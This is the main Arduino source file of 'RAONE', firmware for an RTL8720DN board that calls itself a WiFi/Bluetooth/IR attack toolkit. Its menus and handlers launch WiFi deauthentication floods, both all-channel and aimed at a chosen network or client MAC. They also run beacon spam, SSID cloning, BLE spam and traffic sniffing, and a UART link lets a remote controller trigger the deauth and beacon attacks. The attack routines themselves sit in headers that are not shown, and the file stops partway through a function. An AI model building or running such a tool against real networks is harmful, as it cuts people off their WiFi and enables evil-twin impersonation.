// ─────────────────────────────────────────────────────────────
//  RAONE  –  BW16 RTL8720DN  Firmware v7.0
//  WiFi / Bluetooth / IR attack & analysis toolkit
//  2-button UI: BTN_OK (TTP223 touch) + BTN_NAV (tactile push)
//  Long-hold OK (>800 ms) = EMERGENCY BACK (universal, any state)
//
//  NOTE: Serial debug is DISABLED — PA7/PA8 used for
//        buzzer and IR blaster.  OLED is the only output.
// ─────────────────────────────────────────────────────────────

#include "Config.h"
#include "DisplayUi.h"
#include "HardwareManager.h"
#include "IrBlaster.h"
#include "LabStats.h"
#include "LabTestEngine.h"
#include "TargetManager.h"
#include "WifiScanner.h"
#include "packet-injection.h"
#include "PromiscuousSniffer.h"
#include "BluetoothScanner.h"
#include "BeaconSpam.h"
#include "BleSpam.h"
#include "ClientScanner.h"
#include "Theme.h"
#include "UartProtocol.h"

// ─────────────────────────────────────────────────────────────
//  UI State machine
// ─────────────────────────────────────────────────────────────
enum UiState {
  UI_MAIN_MENU,
  UI_PLACEHOLDER,
  UI_BAND_MENU,
  UI_NETWORK_LIST,
  UI_NETWORK_DETAILS,
  UI_TARGET_DETAILS,
  UI_ANALYZER,
  UI_SYSTEM_INFO,
  UI_SYSTEM_SETTINGS,
  UI_LAB_PRECHECK,
  UI_TARGET_MONITOR,
  UI_LAB_STATS,
  UI_PRINCIPAL_TEST,
  UI_BLE_MENU,
  UI_BLE_LIST,
  UI_BLE_DETAILS,
  UI_BLE_ANALYZER,
  UI_WIFI_ANAL_24,
  UI_WIFI_ANAL_5,
  UI_RADAR_BAND_MENU,
  UI_RADAR_NETWORK_LIST,
  UI_WIFI_RADAR,
  UI_BEACON_SPAM,
  UI_BLE_SPAM,
  UI_SNIFFER,
  UI_IR_MENU,
  UI_ACTION_MENU,
  UI_CLIENT_LIST,
  UI_CLIENT_SCANNING,
  UI_SLAVE_LINKED
};

// ─────────────────────────────────────────────────────────────
//  Menu item arrays  (all English)
// ─────────────────────────────────────────────────────────────

static const char *const MAIN_MENU_ITEMS[] = {
  "Scan Networks",
  "Target / Deauth",
  "Deauth 5G (All)",
  "Deauth 2.4G (All)",
  "Beacon Spam",
  "Sniffer",
  "BLE Tools",
  "IR Remote",
  "System Settings"
};

static const char *const BLE_MENU_ITEMS[] = {
  "Scan Devices",
  "Analyzer",
  "BLE Spam",
  "Back"
};

static const uint8_t MAIN_MENU_COUNT = sizeof(MAIN_MENU_ITEMS) / sizeof(MAIN_MENU_ITEMS[0]);
static const uint8_t BLE_MENU_COUNT  = sizeof(BLE_MENU_ITEMS)  / sizeof(BLE_MENU_ITEMS[0]);

// Lab constants
static const uint16_t LAB_DEAUTH_REASON     = 0x07;
static const uint8_t  LAB_DEAUTH_CYCLE_LIMIT = 50;
static const uint16_t LAB_DEAUTH_TX_GAP_MS  = 10;
static const uint16_t RADAR_REFRESH_MS      = 2500;

// ─────────────────────────────────────────────────────────────
//  Global state
// ─────────────────────────────────────────────────────────────

UiState uiState       = UI_MAIN_MENU;
uint8_t mainMenuIndex = 0;
uint8_t bleMenuIndex  = 0;
uint8_t irMenuIndex   = 0;
uint8_t systemSettingsIndex = 0;

int     selectedNetwork = 0;
int     listTop         = 0;
uint8_t selectedBand    = 5;
uint8_t analyzerBand    = 5;

uint32_t lastRadarScanAt  = 0;
NetworkInfo radarNetwork;
char radarBssid[18]       = {0};
bool radarNetworkFound    = false;
bool radarScanActive      = false;
bool labInjectionStoppedByUser = false;

int     selectedBleDevice = -1;
int     bleListTop        = 0;

// Action menu & client scanning state
uint8_t actionMenuIndex   = 0;
int     actionNetworkIdx  = -1;  // index of the network shown in action menu
uint8_t clientListSel     = 0;
uint8_t clientListTop     = 0;

static const uint8_t ACTION_MENU_COUNT = 6;

// ─────────────────────────────────────────────────────────────
//  Button helpers
// ─────────────────────────────────────────────────────────────

// OK = TTP223 touch sensor on PB20 (active HIGH)
// NAV = Tactile push button on PB3 (active LOW)

static uint32_t _touchHoldStartTime = 0;

static bool attackStopRequested() {
  // ONLY holding the OK touch sensor (TTP223 on PB_20) for >= 800ms will terminate attacks
  if (okPressed()) {
    if (_touchHoldStartTime == 0) {
      _touchHoldStartTime = millis();
    } else if (millis() - _touchHoldStartTime >= 800) {
      _touchHoldStartTime = 0;
      buzzerClick();
      while (okPressed()) delay(10);
      return true;
    }
  } else {
    _touchHoldStartTime = 0;
  }

  return false;
}

static bool anyButtonPressed() {
  return attackStopRequested();
}

// ─────────────────────────────────────────────────────────────
//  Forward declarations
// ─────────────────────────────────────────────────────────────

void handleNav();
void handleOk();
void handleBack();
void emergencyBack();

void drawMainMenu();
void drawBleMenu();
void openMainMenuItem();
void openBleMenuItem();
void runDeauthLab();
void runDeauthLabTargeted(const uint8_t *dstMac);
bool runPacketInjectionLab();
bool runPacketInjectionLabTargeted(const uint8_t *dstMac);
bool stopPacketInjectionLab(bool anySent, uint32_t sentCount);
void returnToDeauthCaller(UiState returnState);
bool labStopRequested();
void waitForLabButtonsReleased();
bool isInjectionBlockedSecurity(uint32_t security);
bool parseMacAddress(const char *text, uint8_t mac[6]);
int  hexValue(char value);
void runTargetRefresh();
bool sameTarget(uint8_t networkIndex);
void showPlaceholder(const char *title, const char *message);
void runScan();
uint8_t nextIndex(uint8_t current, uint8_t count);
uint8_t previousIndex(uint8_t current, uint8_t count);
uint8_t nextBandOption(uint8_t current);
void moveSelectionAll(int delta);
void selectFirstNetworkInBand();
void normalizeListTop();
void moveBleSelection(int delta);
void closeBleAnalyzer();
void closeBleScanList();
void exitBeaconSpam();
void exitBleSpam();
void exitWifiAnalyzer();
void exitSniffer();
void startSniffer(uint8_t band);

void telemetryWatchdogTask(const void *arg) {
  (void)arg;
  static uint32_t lastReportSeq = 0;
  static bool reportedFreeze = false;

  while (1) {
    delay(1000);

    TxProbeSummary summary = txProbeGetSummary();
    
    // Emit 1-second Serial heartbeat from safe background thread
    Serial.print(F("[HEARTBEAT] Up: "));
    Serial.print(millis() / 1000);
    Serial.print(F("s | Heap: "));
    Serial.print((uint32_t)xPortGetFreeHeapSize());
    Serial.print(F("B | TxCount: "));
    Serial.print(summary.total_entered);
    Serial.print(F(" | Stage: "));
    Serial.println(summary.current_stage);

    if (summary.total_entered > 0) {
      uint32_t elapsed = millis() - summary.last_activity_ms;
      if (elapsed >= 1500 && !reportedFreeze && summary.current_stage != TX_STAGE_IDLE) {
        reportedFreeze = true;
        Serial.println(F("\n[PROBE WATCHDOG] *** TX FREEZE DETECTED (>1500ms inactivity) ***"));
        txProbePrintReport();
      } else if (summary.total_entered != lastReportSeq) {
        lastReportSeq = summary.total_entered;
        reportedFreeze = false;
      }
    }
  }
}

void asyncRadioInitTask(const void *arg) {
  (void)arg;
  wifiScannerBegin();
  sniffBegin();
  bleBegin();
  beaconSpamBegin();
  bleSpamBegin();
  wifiScannerStartScan();
  vTaskDelete(NULL);
}

void setup() {
  Serial.begin(115200);

  // 1. Initialize hardware (Sets onboard RGB to Solid PURPLE permanently) & OLED display
  hwBegin();
  uiBegin();

  // 2. Paint boot screen instantly so user never sees a black display
  uiDrawSplashProgress(5, "INITIALIZING...");

  Serial.println(F("\n\n=========================================="));
  Serial.println(F("NICE MCU RTL8720DN DIAGNOSTIC BOOT"));
  Serial.println(F("=========================================="));
  Serial.println(F("Serial OK (115200 Baud, LOG_UART PA7/PA8)"));
  Serial.println(F("Telemetry Initialized"));
  Serial.println(F("Starting TX diagnostics..."));
  Serial.println(F("==========================================\n"));

  // 3. Launch background threads concurrently (Zero blocking on melody!)
  uartProtocolBegin(115200);
  irBegin();
  os_thread_create_arduino(telemetryWatchdogTask, NULL, OS_PRIORITY_ABOVENORMAL, 2048);
  os_thread_create_arduino(asyncRadioInitTask, NULL, OS_PRIORITY_NORMAL, 4096);

  // 4. 100% Smooth Continuous 4.5-Second Melodic Boot Splash (Harry Potter Hedwig Theme)
  struct BootMelodyStep {
    uint16_t freq;  // Note pitch (Hz)
    uint16_t dur;   // Note duration (ms)
    uint16_t pause; // Inter-note silence (ms)
    uint8_t  led;   // 1=Red, 2=Green, 3=Yellow, 4=All Three
  };

  static const BootMelodyStep NOTES[] = {
    // Measure 1: B4 (upbeat) -> E5 (downbeat) -> G5 (passing) -> F#5 (pivot)
    { 494, 150,  50, 1 }, // Note 0:  B4  -> RED (pickup pulse)
    { 659, 220,  60, 2 }, // Note 1:  E5  -> GREEN (strong accent)
    { 784, 100,  40, 3 }, // Note 2:  G5  -> YELLOW (quick bright step)
    { 740, 150,  50, 2 }, // Note 3:  F#5 -> GREEN (melodic pivot)

    // Measure 2: E5 (sustained) -> B5 (leap) -> A5 (peak held note)
    { 659, 300,  80, 1 }, // Note 4:  E5  -> RED (sustained hold)
    { 988, 160,  60, 3 }, // Note 5:  B5  -> YELLOW (high jump)
    { 880, 320,  80, 2 }, // Note 6:  A5  -> GREEN (peak hold)

    // Measure 3: F#5 (falling sustain) -> E5 (downbeat) -> G5 -> F#5
    { 740, 320,  80, 1 }, // Note 7:  F#5 -> RED (sustained glow)
    { 659, 220,  60, 2 }, // Note 8:  E5  -> GREEN (downbeat accent)
    { 784, 100,  40, 3 }, // Note 9:  G5  -> YELLOW (quick step)
    { 740, 150,  50, 2 }, // Note 10: F#5 -> GREEN (pivot)

    // Measure 4: D#5 (deep tension) -> F5 -> B4 (low bass) -> A4 -> B4 (resolution)
    { 622, 300,  80, 1 }, // Note 11: D#5 -> RED (deep hold)
    { 698, 160,  60, 3 }, // Note 12: F5  -> YELLOW (bright step)
    { 494, 300,  80, 1 }, // Note 13: B4  -> RED (low bass hold)
    { 440, 160,  60, 2 }, // Note 14: A4  -> GREEN (cadence step)
    { 494, 380, 100, 4 }  // Note 15: B4  -> ALL THREE (Grand Final Chord!)
  };

  const size_t totalNotes = sizeof(NOTES) / sizeof(NOTES[0]);

  for (size_t i = 0; i < totalNotes; i++) {
    uint8_t percent = ((i + 1) * 100) / totalNotes;
    const char *msg = "BOOTING RAONE...";
    if (percent < 20) {
      msg = "INIT HARDWARE...";
    } else if (percent < 40) {
      msg = "CALIBRATING RADIO...";
    } else if (percent < 60) {
      msg = "SCANNING 2.4G & 5G...";
    } else if (percent < 85) {
      msg = "BUILDING AP MATRIX...";
    } else {
      msg = "SYSTEM READY!";
    }

    uiDrawSplashProgress(percent, msg);
    uartPollCommand();

    // 1. Turn ON LED in strict R→G→Y→R→G→Y cycle
    ledStepRGY(i);
    playTone(NOTES[i].freq, NOTES[i].dur);

    // 2. Turn strictly OFF all LEDs during the rest period (Zero bleed!)
    ledMelodySet(0);
    if (NOTES[i].pause > 0) delay(NOTES[i].pause);
  }

  // Non-blocking scan check
  bool scanFinished = false;
  wifiScannerPollScan(&scanFinished);

  ledCelebrateSync();
  buzzerSuccess();
  ledSetOnboardPurple();
  setLedMode(LED_MODE_IDLE);
  setSystemMode(SYS_MODE_STANDALONE);
  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  loop()
// ─────────────────────────────────────────────────────────────

void loop() {
  // ── UART Remote Commands (From TetraX Master) ────────────────
  UartCommand ucmd = uartPollCommand();
  if (ucmd.type != UART_CMD_NONE) {
    if (ucmd.type == UART_CMD_PING) {
      if (uiState != UI_SLAVE_LINKED) {
        setSystemMode(SYS_MODE_SLAVE);
        uiState = UI_SLAVE_LINKED;
        uiDrawSlaveLinked("TetraX ESP32");
        buzzerClick();
      }
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_NAV) {
      handleNav();
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_OK) {
      handleOk();
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_BACK || ucmd.type == UART_CMD_STOP) {
      emergencyBack();
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_DEAUTH_ALL_24) {
      runDeauthAllChannels(2);
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_DEAUTH_ALL_5G) {
      runDeauthAllChannels(5);
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_BEACON_24) {
      if (beaconSpamStart(2)) { uiState = UI_BEACON_SPAM; uiDrawBeaconSpam(); }
      goto after_buttons;
    } else if (ucmd.type == UART_CMD_BEACON_5G) {
      if (beaconSpamStart(5)) { uiState = UI_BEACON_SPAM; uiDrawBeaconSpam(); }
      goto after_buttons;
    }
  }

  // ── Physical Button reading ──────────────────────────────────
  // OK  = TTP223 touch sensor (PB20, active HIGH)
  //   Short tap  → handleOk()
  // ── Physical Button reading ──────────────────────────────────
  // OK  = TTP223 touch sensor (PB20, active HIGH)
  //   Short tap   → handleOk()
  //   Hold >800ms → UNIVERSAL emergency back / terminate (emergencyBack)
  // NAV = Tactile push button (PB3, active LOW)
  //   Short tap   → handleNav()
  //   Hold down   → Smooth auto-scroll (repeats every 200ms after 350ms initial delay)

  if (okPressed()) {
    delay(20); // debounce
    if (okPressed()) {
      buzzerClick();
      uint32_t pressStart = millis();
      bool longPress = false;
      while (okPressed()) {
        if (millis() - pressStart >= 800) {
          longPress = true;
          buzzerClick(); // feedback for long hold
          while (okPressed()) delay(10); // wait release
          emergencyBack(); // universal emergency back / terminate
          goto after_buttons;
        }
        delay(10);
      }
      if (!longPress) {
        handleOk();
      }
    }
  }

  static uint32_t navPressStart = 0;
  static uint32_t lastNavRepeat = 0;
  if (navPressed()) {
    if (navPressStart == 0) {
      navPressStart = millis();
      lastNavRepeat = millis();
      buzzerClick();
      handleNav();
    } else {
      // Held down: auto-scroll smoothly (not too fast, 200ms per step after 350ms initial hold)
      if (millis() - navPressStart > 350 && millis() - lastNavRepeat > 200) {
        lastNavRepeat = millis();
        buzzerClick();
        handleNav();
      }
    }
  } else {
    navPressStart = 0;
  }

after_buttons:

  ledTaskUpdate();

  // ── Background tasks ─────────────────────────────────────────

  if (uiState == UI_MAIN_MENU || uiState == UI_PLACEHOLDER ||
      uiState == UI_PLACEHOLDER  || uiState == UI_BAND_MENU ||
      uiState == UI_RADAR_BAND_MENU || uiState == UI_BLE_MENU) {
    uiTickMenuAnimation();
  }

  if (bleActive()) {
    bleAnalyzerTick();
  }

  if (uiState == UI_SNIFFER) {
    sniffTick();
    static uint32_t lastSniffRefresh = 0;
    if (millis() - lastSniffRefresh > 250) {
      lastSniffRefresh = millis();
      uiRefreshSniffer(sniffGetStats());
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BLE_LIST) {
    static uint32_t lastBleRefresh = 0;
    if (millis() - lastBleRefresh > 500) {
      lastBleRefresh = millis();
      uiRefreshBleList(selectedBleDevice, bleListTop);
    }
  }

  if (uiState == UI_BLE_ANALYZER) {
    static uint32_t lastAnalRefresh = 0;
    if (millis() - lastAnalRefresh > 100) {
      lastAnalRefresh = millis();
      uiRefreshBleAnalyzer();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffTick();
    wifiAnalyzerTick();
    static uint32_t lastWifiAnalRefresh = 0;
    if (millis() - lastWifiAnalRefresh > 100) {
      lastWifiAnalRefresh = millis();
      uiRefreshWifiAnalyzer();
    }
    ledTaskUpdate();
  }

  if (radarScanActive) {
    bool scanOk = false;
    if (wifiScannerPollScan(&scanOk)) {
      radarScanActive = false;
      lastRadarScanAt = millis();
      if (uiState == UI_WIFI_RADAR) {
        int foundIndex = scanOk ? wifiScannerFindBssid(radarBssid) : -1;
        radarNetworkFound = foundIndex >= 0;
        if (radarNetworkFound) {
          radarNetwork  = wifiScannerNetwork(foundIndex);
          selectedNetwork = foundIndex;
        }
        uiDrawWifiRadar(&radarNetwork, radarNetworkFound);
      }
    }
  }

  if (uiState == UI_WIFI_RADAR) {
    uiTickWifiRadar();
    if (!radarScanActive && millis() - lastRadarScanAt >= RADAR_REFRESH_MS) {
      radarScanActive = wifiScannerStartScan();
      if (!radarScanActive) lastRadarScanAt = millis();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BEACON_SPAM) {
    beaconSpamTick();
    static uint32_t lastBeaconRefresh = 0;
    if (millis() - lastBeaconRefresh > 250) {
      lastBeaconRefresh = millis();
      uiRefreshBeaconSpam();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BLE_SPAM) {
    bleSpamTick();
    static uint32_t lastBleSpamRefresh = 0;
    if (millis() - lastBleSpamRefresh > 250) {
      lastBleSpamRefresh = millis();
      uiRefreshBleSpam();
    }
    ledTaskUpdate();
  }

  delay(60);
}

// ─────────────────────────────────────────────────────────────
//  Menu draw helpers
// ─────────────────────────────────────────────────────────────

void drawMainMenu() {
  uiState = UI_MAIN_MENU;
  uiDrawMenu("RAONE", MAIN_MENU_ITEMS, MAIN_MENU_COUNT, mainMenuIndex,
             "NAV=next  OK=select");
}

void drawBleMenu() {
  uiState = UI_BLE_MENU;
  uiDrawMenu("BLUETOOTH", BLE_MENU_ITEMS, BLE_MENU_COUNT, bleMenuIndex,
             "NAV=next  OK=select");
}

// ─────────────────────────────────────────────────────────────
//  NAV handler – cycles selection forward in current context
// ─────────────────────────────────────────────────────────────

void handleNav() {
  if (uiState == UI_SLAVE_LINKED) {
    drawMainMenu();
    delay(150);
    return;
  }

  if (uiState == UI_MAIN_MENU) {
    mainMenuIndex = nextIndex(mainMenuIndex, MAIN_MENU_COUNT);
    drawMainMenu();
    delay(150);
    return;
  }

  if (uiState == UI_SYSTEM_SETTINGS) {
    systemSettingsIndex = (systemSettingsIndex + 1) % 4;
    uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
    delay(150);
    return;
  }

  if (uiState == UI_BLE_MENU) {
    bleMenuIndex = nextIndex(bleMenuIndex, BLE_MENU_COUNT);
    drawBleMenu();
    delay(150);
    return;
  }

  if (uiState == UI_IR_MENU) {
    irMenuIndex = nextIndex(irMenuIndex, irCodeCount());
    uiRefreshIrMenu(irMenuIndex);
    delay(150);
    return;
  }

  if (uiState == UI_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawBandMenu(selectedBand);
    delay(150);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawRadarBandMenu(selectedBand);
    delay(150);
    return;
  }

  if (uiState == UI_NETWORK_LIST || uiState == UI_RADAR_NETWORK_LIST) {
    moveSelectionAll(1);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    moveBleSelection(1);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) {
    bleAnalyzerReset();
    uiDrawBleAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffResetStats();
    wifiAnalyzerReset();
    uiDrawWifiAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_ANALYZER) {
    analyzerBand = (analyzerBand == 5) ? 2 : 5;
    uiDrawAnalyzer(analyzerBand);
    delay(200);
    return;
  }

  if (uiState == UI_ACTION_MENU) {
    actionMenuIndex = (actionMenuIndex + 1) % ACTION_MENU_COUNT;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    delay(150);
    return;
  }

  if (uiState == UI_CLIENT_LIST) {
    uint8_t count = clientScanCount() + 1; // +1 for Back item
    clientListSel = (clientListSel + 1) % count;
    if (clientListSel >= clientListTop + UI_MENU_VISIBLE) {
      clientListTop = clientListSel - (UI_MENU_VISIBLE - 1);
    } else if (clientListSel < clientListTop) {
      clientListTop = clientListSel;
    }
    const char *macStrs[MAX_CLIENTS];
    for (uint8_t i = 0; i < clientScanCount(); i++) macStrs[i] = clientScanGet(i).macStr;
    uiDrawClientList(macStrs, clientListSel, clientListTop, clientScanCount());
    delay(150);
    return;
  }
}

// ─────────────────────────────────────────────────────────────
//  Client Scan Runner (6-second interactive sniffer)
// ─────────────────────────────────────────────────────────────

void runClientScan(uint8_t channel, const uint8_t *targetMacBytes) {
  uiState = UI_CLIENT_SCANNING;
  clientScanStart(channel, targetMacBytes);

  uint32_t startMs = millis();
  while (millis() - startMs < 6000) {
    if (attackStopRequested()) {
      clientScanStop();
      buzzerClick();
      uiState = UI_ACTION_MENU;
      uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
      return;
    }

    uint32_t elapsed = millis() - startMs;
    uint8_t remaining = (elapsed < 6000) ? (6 - (elapsed / 1000)) : 1;
    char subMsg[32];
    snprintf(subMsg, sizeof(subMsg), "Found: %u | %us left", clientScanCount(), remaining);
    uiDrawGenericMessage("SCANNING CLIENTS", subMsg, "Hold OK to cancel");

    delay(200);
    yield();
  }

  clientScanStop();
  buzzerScanDone();

  uiState = UI_CLIENT_LIST;
  clientListSel = 0;
  clientListTop = 0;
  const char *macStrs[MAX_CLIENTS];
  for (uint8_t i = 0; i < clientScanCount(); i++) macStrs[i] = clientScanGet(i).macStr;
  uiDrawClientList(macStrs, clientListSel, clientListTop, clientScanCount());
}

// ─────────────────────────────────────────────────────────────
//  OK handler – select / confirm
// ─────────────────────────────────────────────────────────────

void handleOk() {
  if (uiState == UI_SLAVE_LINKED) {
    drawMainMenu();
    delay(150);
    return;
  }

  if (uiState == UI_MAIN_MENU) { openMainMenuItem(); return; }
  if (uiState == UI_BLE_MENU)  { openBleMenuItem();  return; }

  if (uiState == UI_SYSTEM_SETTINGS) {
    if (systemSettingsIndex == 0) {
      g_buzzerEnabled = !g_buzzerEnabled;
      if (g_buzzerEnabled) buzzerClick();
      uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
    } else if (systemSettingsIndex == 1) {
      g_ledEnabled = !g_ledEnabled;
      if (!g_ledEnabled) {
        ledAllOff();
      } else {
        ledFlashGreen(1, 100);
      }
      uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
    } else if (systemSettingsIndex == 2) {
      uiState = UI_SYSTEM_INFO;
      uint8_t c24 = wifiScannerCountBand(2);
      uint8_t c5  = wifiScannerCountBand(5);
      uint8_t tot = wifiScannerCount();
      uiDrawSystemInfo(targetHasSelection(), tot, c24, c5);
    } else {
      drawMainMenu();
    }
    delay(200);
    return;
  }

  if (uiState == UI_IR_MENU) {
    uiDrawStatus("Transmitting...");
    irTransmit(irMenuIndex);
    ledFlashGreen(1, 80);
    buzzerClick();
    uiRefreshIrMenu(irMenuIndex);
    delay(300);
    return;
  }

  if (uiState == UI_NETWORK_DETAILS) {
    actionNetworkIdx = selectedNetwork;
    actionMenuIndex = 0;
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(selectedNetwork), actionMenuIndex);
    delay(200);
    return;
  }

  if (uiState == UI_TARGET_DETAILS) { runDeauthLab(); return; }

  if (uiState == UI_ANALYZER) {
    drawMainMenu();
    delay(200);
    return;
  }

  if (uiState == UI_WIFI_RADAR) {
    int radarIndex = wifiScannerFindBssid(radarBssid);
    if (radarIndex >= 0) {
      selectedNetwork = radarIndex;
    } else {
      selectFirstNetworkInBand();
    }
    listTop = 0;
    uiState = UI_RADAR_NETWORK_LIST;
    uiDrawNetworkListAll(selectedNetwork, listTop);
    delay(200);
    return;
  }

  if (uiState == UI_TARGET_MONITOR) { runTargetRefresh(); return; }

  if (uiState == UI_LAB_PRECHECK || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) {
    drawMainMenu();
    delay(200);
    return;
  }

  if (uiState == UI_SYSTEM_INFO) { drawMainMenu(); delay(200); return; }

  if (uiState == UI_BLE_DETAILS) {
    uiState = UI_BLE_LIST;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(200);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) { closeBleAnalyzer(); delay(200); return; }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    exitWifiAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    if (selectedBleDevice < 0) {
      closeBleScanList();
      delay(200);
      return;
    }
    if (selectedBleDevice < (int)bleCount()) {
      BleDeviceInfo device;
      if (!bleCopyDevice(selectedBleDevice, device)) return;
      uiState = UI_BLE_DETAILS;
      uiDrawBleDetails(device);
      delay(200);
    }
    return;
  }

  if (uiState == UI_BAND_MENU) {
    uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
    if (beaconSpamStart(selectedBand)) {
      uiState = UI_BEACON_SPAM;
      uiDrawBeaconSpam();
    } else {
      showPlaceholder("Beacon Spam", "Failed to start");
    }
    delay(200);
    return;
  }

  if (uiState == UI_NETWORK_LIST) {
    if (selectedNetwork == 0) {
      runScan();
      return;
    }
    if (selectedNetwork > (int)wifiScannerCount() || selectedNetwork < 0) {
      drawMainMenu();
      delay(200);
      return;
    }
    actionNetworkIdx = selectedNetwork - 1;
    actionMenuIndex = 0;
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    delay(200);
    return;
  }

  if (uiState == UI_ACTION_MENU) {
    if (actionMenuIndex == 0) {
      // Deauth (All)
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLab(); 
    }
    else if (actionMenuIndex == 1) {
      // Scan Clients
      uint8_t targetMacBytes[6];
      parseMacAddress(wifiScannerNetwork(actionNetworkIdx).bssid, targetMacBytes);
      runClientScan(wifiScannerNetwork(actionNetworkIdx).channel, targetMacBytes);
    }
    else if (actionMenuIndex == 2) {
      // Clone & Beacon
      uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
      beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
      uint8_t band = wifiScannerIs5GHz(wifiScannerNetwork(actionNetworkIdx).channel) ? 5 : 2;
      if (beaconSpamStart(band)) {
        uiState = UI_BEACON_SPAM;
        uiDrawBeaconSpam();
      } else {
        showPlaceholder("Beacon Spam", "Failed to start");
      }
    }
    else if (actionMenuIndex == 3) {
      // Sniff Traffic
      startSniffer(wifiScannerNetwork(actionNetworkIdx).channel);
    }
    else if (actionMenuIndex == 4) {
      // Set as Target
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      uiDrawGenericMessage("Target Saved", targetGet().ssid, "Ready for Deauth");
      delay(1200);
      uiState = UI_NETWORK_LIST;
      uiDrawNetworkListAll(selectedNetwork, listTop);
    }
    else if (actionMenuIndex == 5) {
      // Back
      uiState = UI_NETWORK_LIST;
      uiDrawNetworkListAll(selectedNetwork, listTop);
    }
    delay(200);
    return;
  }

  if (uiState == UI_CLIENT_LIST) {
    if (clientListSel < clientScanCount()) {
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLabTargeted(clientScanGet(clientListSel).mac);
    } else {
      uiState = UI_ACTION_MENU;
      uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    }
    delay(200);
    return;
  }

  if (uiState == UI_BEACON_SPAM) { exitBeaconSpam(); delay(200); return; }
  if (uiState == UI_BLE_SPAM)    { exitBleSpam();    delay(200); return; }
  if (uiState == UI_SNIFFER)     { exitSniffer();    delay(200); return; }
}

// ─────────────────────────────────────────────────────────────
//  Long-press OK = go back one level
// ─────────────────────────────────────────────────────────────

void handleBack() {
  if (uiState == UI_MAIN_MENU && getSystemMode() == SYS_MODE_SLAVE) {
    uiState = UI_SLAVE_LINKED;
    uiDrawSlaveLinked("TetraX ESP32");
    return;
  }
  if (uiState == UI_BLE_MENU)         { drawMainMenu(); return; }
  if (uiState == UI_IR_MENU)          { drawMainMenu(); return; }
  if (uiState == UI_PLACEHOLDER)      { drawMainMenu(); return; }
  if (uiState == UI_CLIENT_LIST)      { uiState = UI_ACTION_MENU; uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex); return; }
  if (uiState == UI_ACTION_MENU)      { uiState = UI_NETWORK_LIST; uiDrawNetworkListAll(selectedNetwork, listTop); return; }
  if (uiState == UI_NETWORK_DETAILS)  { uiState = UI_NETWORK_LIST; uiDrawNetworkListAll(selectedNetwork, listTop); return; }
  if (uiState == UI_TARGET_DETAILS)   { drawMainMenu(); return; }
  if (uiState == UI_ANALYZER)         { drawMainMenu(); return; }
  if (uiState == UI_WIFI_RADAR)       { drawMainMenu(); return; }
  if (uiState == UI_RADAR_BAND_MENU)  { drawMainMenu(); return; }
  if (uiState == UI_RADAR_NETWORK_LIST) { drawMainMenu(); return; }
  if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) { drawMainMenu(); return; }
  if (uiState == UI_SYSTEM_SETTINGS)  { drawMainMenu(); return; }
  if (uiState == UI_SYSTEM_INFO)      { uiState = UI_SYSTEM_SETTINGS; uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled); return; }
  if (uiState == UI_BLE_DETAILS)      { uiState = UI_BLE_LIST; uiDrawBleList(selectedBleDevice, bleListTop); return; }
  if (uiState == UI_BLE_LIST)         { closeBleScanList(); return; }
  if (uiState == UI_BLE_ANALYZER)     { closeBleAnalyzer(); return; }
  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) { exitWifiAnalyzer(); return; }
  if (uiState == UI_BEACON_SPAM)      { exitBeaconSpam(); return; }
  if (uiState == UI_BLE_SPAM)         { exitBleSpam(); return; }
  if (uiState == UI_SNIFFER)          { exitSniffer(); return; }
  if (uiState == UI_BAND_MENU || uiState == UI_NETWORK_LIST) { drawMainMenu(); return; }
  // Default: back to main
  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  Emergency back — universal terminator from ANY state
//  Touch sensor long-hold triggers this.
//  Stops any running attack, scan, or tool and goes to main menu.
// ─────────────────────────────────────────────────────────────

void emergencyBack() {
